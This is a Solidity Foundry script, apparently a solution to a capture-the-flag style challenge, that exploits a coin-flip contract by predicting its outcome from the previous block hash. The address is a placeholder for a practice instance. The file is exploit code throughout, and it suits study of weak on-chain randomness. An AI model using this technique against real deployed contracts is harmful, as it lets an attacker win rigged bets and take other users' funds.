// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";

interface CoinFlip {
    function flip(bool _guess) external returns (bool);
}

/**
 * @notice Since the attacked contract checks for the hash of the last block, the attack cannot run 10 times in the same transaction otherwise it would revert, therefore this script needs to be executed 10 separate times to succeed.
 */
contract AttackCoinFlip is Script {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    CoinFlip public victim = CoinFlip(address(0x0)); // TODO: Add your instance address

    function run() public {
        vm.startBroadcast();
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        bool success = victim.flip(side);
        require(success, "didn't guess right");
        vm.stopBroadcast();
    }
}
